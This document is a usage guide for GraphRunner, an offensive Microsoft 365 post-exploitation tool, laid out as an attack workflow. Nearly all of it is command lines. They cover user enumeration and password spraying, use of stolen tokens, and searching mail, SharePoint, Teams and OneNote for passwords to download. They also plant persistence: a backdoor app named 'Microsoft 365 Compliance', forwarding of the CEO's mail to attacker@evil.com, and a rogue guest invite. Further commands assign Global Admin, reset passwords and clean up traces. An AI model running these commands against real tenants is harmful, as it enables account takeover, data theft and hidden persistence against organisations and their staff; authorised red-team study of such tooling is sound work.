# GraphRunner — Usage Guide

## Attack Workflow

GraphRunner is designed around the typical M365 post-exploitation workflow:

```
Pre-Auth Recon → Authentication → Post-Auth Recon → Pillage → Persist → Escalate → Cleanup
```

---

## Phase 0: Pre-Auth Reconnaissance (No Credentials)

Before even authenticating, you can gather valuable information:

```bash
# Check if a domain uses Azure AD / federation
./graphrunner recon domain-info contoso.com

# Enumerate valid usernames (no lockout risk)
./graphrunner recon user-enum --user-file usernames.txt --delay 1

# Brute-force valid client IDs in the tenant
./graphrunner spray brute-clientid --tenant-id contoso.com
```

**User enumeration** abuses the `GetCredentialType` API (same technique as AADInternals). It reveals:
- Whether the user exists
- If the user is federated (ADFS) or cloud-only
- Throttle type (which may indicate smart lockout status)

**Domain info** queries the OpenID configuration and UserRealm endpoints to discover:
- Tenant ID
- Federation server URLs (ADFS, PingFederate, etc.)
- Authentication endpoints
- Cloud instance name

---

## Phase 1: Authentication

### Option A: Device Code (default, easiest)

```bash
./graphrunner auth login
```

Uses the Azure PowerShell public client by default. This is the most reliable method for delegated access.

### Option B: Stolen Token

```bash
# Import from browser devtools, ROADTools, etc.
./graphrunner auth import-token --access-token "eyJ0eXAi..." --refresh-token "0.ATcA..."

# Token swap to different resource
./graphrunner auth token-swap --resource vault --name vault-session
```

### Option C: Certificate Auth (Service Principal)

```bash
./graphrunner auth cert-login \
  --tenant-id <tid> \
  --client-id <cid> \
  --cert ./cert.pfx \
  --pfx-password 'password'
```

### Option D: Client Credentials

```bash
./graphrunner auth app-login \
  --tenant-id <tid> \
  --client-id <cid> \
  --client-secret <secret>
```

### Option E: Password Spray

```bash
./graphrunner spray password \
  --tenant-id contoso.com \
  --user-file users.txt \
  --passwords "Spring2024!,Welcome1!" \
  --delay 30
```

### Managing Sessions

```bash
./graphrunner auth sessions          # See all sessions
./graphrunner auth use admin-session  # Switch active
./graphrunner auth watch             # Keep token alive
./graphrunner auth whoami            # Verify identity
```

---

## Phase 2: Post-Auth Reconnaissance

### Quick Recon

```bash
# Who am I, what's this tenant?
./graphrunner auth whoami
./graphrunner recon tenant

# What users, groups, and apps exist?
./graphrunner recon users
./graphrunner recon groups
./graphrunner recon apps
```

### Security Assessment

```bash
# What conditional access policies are in place?
./graphrunner recon caps

# Who has privileged roles?
./graphrunner recon roles

# Who has MFA disabled?
./graphrunner recon mfa-status

# What secrets are expired/weak?
./graphrunner recon sp-secrets

# What delegated permissions look dangerous?
./graphrunner recon delegated-perms
```

### SharePoint Assessment

```bash
# Quick site discovery
./graphrunner recon sharepoint

# Full audit: public sites, external sharing, file counts, risk table
./graphrunner recon sp-audit

# Deep enumeration: permissions, drives, lists per site
./graphrunner recon sharepoint-deep
```

### Infrastructure Recon

```bash
# Named locations (trusted IPs/countries)
./graphrunner recon named-locations

# Cross-tenant access policies
./graphrunner recon cross-tenant

# Intune managed devices
./graphrunner recon intune-devices

# Application Proxy apps (internal URLs exposed externally)
./graphrunner recon app-proxy

# Audit logs (who did what)
./graphrunner recon audit-logs --top 200
```

### Full Recon (everything)

```bash
./graphrunner recon all -v --output-csv full-recon.csv --log-file recon.log
```

---

## Phase 3: Data Pillaging

### Email

```bash
# Search for secrets in mailboxes
./graphrunner pillage mailbox --keywords "password,secret,api key,credential"

# Read specific user's inbox
./graphrunner pillage inbox --user admin@contoso.com --top 100
```

### SharePoint / OneDrive

```bash
# KQL search (most powerful)
./graphrunner pillage kql-search --query "password filetype:xlsx"
./graphrunner pillage kql-search --query "confidential filetype:pdf" --download-dir ./loot

# Browse drive files directly (when Search API is restricted)
./graphrunner pillage sp-files --site-id <id> --extensions xlsx,docx --download-dir ./loot

# OneDrive per user
./graphrunner pillage onedrive --user admin@contoso.com --download-dir ./loot --extensions xlsx,docx,pdf

# Download a specific file (using IDs from kql-search output)
./graphrunner pillage download --drive-id <did> --item-id <iid> --output secret.xlsx
```

### Teams

```bash
# Search Teams messages
./graphrunner pillage teams --keywords "password,vpn,credentials"

# Download 1:1 chats
./graphrunner pillage chats --limit 50
```

### Other Data Sources

```bash
# OneNote notebooks (often contain passwords/configs)
./graphrunner pillage notebooks --keywords "password,admin,root"

# Calendar events (meeting links with passwords)
./graphrunner pillage calendar --user admin@contoso.com

# Planner tasks
./graphrunner pillage planner

# Outlook contacts
./graphrunner pillage contacts --user admin@contoso.com

# User directory attributes (passwords in description fields)
./graphrunner pillage user-attrs --keywords "password,pass,key"
```

---

## Phase 4: Persistence

```bash
# Create backdoor OAuth app
./graphrunner persist inject-app --app-name "Microsoft 365 Compliance"

# Shadow certificate on existing app
./graphrunner persist add-key-cred --app-id <object-id> --valid-days 730

# Email forwarding for continuous access
./graphrunner persist mail-rule --user-id ceo@contoso.com --forward-to attacker@evil.com

# Invite guest account
./graphrunner persist invite-guest --email attacker@evil.com --display-name "IT Helpdesk"

# Add yourself to a privileged group
./graphrunner persist add-member --group-id <admin-group-id> --user-id <your-oid>
```

---

## Phase 5: Privilege Escalation

```bash
# Add creds to an app you own or have Owner permission on
./graphrunner escalate add-app-creds --app-name "Target App"

# Grant yourself dangerous permissions
./graphrunner escalate grant-app-perm --sp-id <your-sp> --role-id <mail-readwrite-id>

# Admin consent for delegated permissions
./graphrunner escalate admin-consent --sp-id <sp-id> --scopes "Mail.ReadWrite Files.ReadWrite.All"

# Assign Global Admin role
./graphrunner escalate assign-role --role-id <global-admin-role-id> --principal-id <your-oid>

# Reset a user's password
./graphrunner escalate reset-password --user-id target@contoso.com --password "Controlled!"
```

---

## Phase 6: Cleanup

```bash
# Remove injected secrets
./graphrunner cleanup remove-secret --app-id <oid> --key-id <key-id>
./graphrunner cleanup remove-key-cred --app-id <oid> --key-id <key-id>

# Remove forwarding rules
./graphrunner cleanup remove-mail-rule --user-id ceo@contoso.com --rule-id <rule-id>

# Delete backdoor app
./graphrunner cleanup delete-app --app-id <object-id>

# Remove yourself from groups
./graphrunner cleanup remove-member --group-id <gid> --member-id <your-oid>

# Delete cloned groups
./graphrunner cleanup delete-group --group-id <gid>
```

---

## Tips & Tricks

### Verbose Mode

Use `-v` on any command to see per-item progress (pagination, individual resources):

```bash
./graphrunner recon users -v
./graphrunner pillage kql-search --query "*" -v
```

### Multi-Session Workflows

```bash
# Login as different users
./graphrunner auth login --name user1
./graphrunner auth login --name admin1

# Run commands with specific sessions
./graphrunner recon users -s user1
./graphrunner escalate assign-role -s admin1 --role-id ... --principal-id ...
```

### Proxy + Log Everything

```bash
./graphrunner --proxy http://127.0.0.1:8080 --log-file audit.log -v recon all
```

### Export Workflows

```bash
# JSON (auto-saved by default)
ls output/

# CSV for spreadsheet analysis
./graphrunner recon users --output-csv users.csv
./graphrunner recon groups --output-csv groups.csv

# HTML report
./graphrunner run --output-html full-report.html
```

### Piping Token to Other Tools

```bash
# Use with curl
curl -H "Authorization: Bearer $(./graphrunner auth token -r)" \
  "https://graph.microsoft.com/v1.0/me"

# Use with httpie
http GET https://graph.microsoft.com/v1.0/me \
  "Authorization: Bearer $(./graphrunner auth token -r)"
```
